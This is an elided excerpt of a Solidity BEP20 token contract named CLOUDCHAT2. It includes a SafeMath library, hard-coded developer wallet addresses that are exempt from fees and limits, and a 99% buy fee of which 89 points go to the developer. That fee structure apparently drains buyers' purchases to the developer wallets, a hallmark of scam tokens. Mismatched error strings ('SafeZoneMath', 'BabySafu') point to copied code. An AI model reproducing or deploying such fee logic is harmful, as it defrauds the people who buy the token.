...
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeZoneMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeZoneMath: subtraction overflow");
    }
    ...
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        ...
        uint256 c = a * b;
        require(c / a == b, "SafeZoneMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeZoneMath: division by zero");
    }
...
contract CLOUDCHAT2 is IBEP20, Auth {
    ...
    address DEV =  0x4334Afb7539D87958217Af518B4e3154ff6842d9;
    address DEV1 =  0x9c8C6D68ed26b6Ba1FffEF2F9725331D4846Ed80;
    ...
    uint256 devFeeBuy = 89;
    uint256 totalFeeBuy = 99;
    ...
    constructor () Auth(msg.sender) {
        ...
        isFeeExempt[DEV1] = true;
        isTxLimitExempt[_presaler] = true;
        isTxLimitExempt[DEV] = true;
        isTxLimitExempt[DEV1] = true;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        //Exchange tokens
        _balances[sender] = _balances[sender].sub(amount, "Insufficient BabySafu Balance");
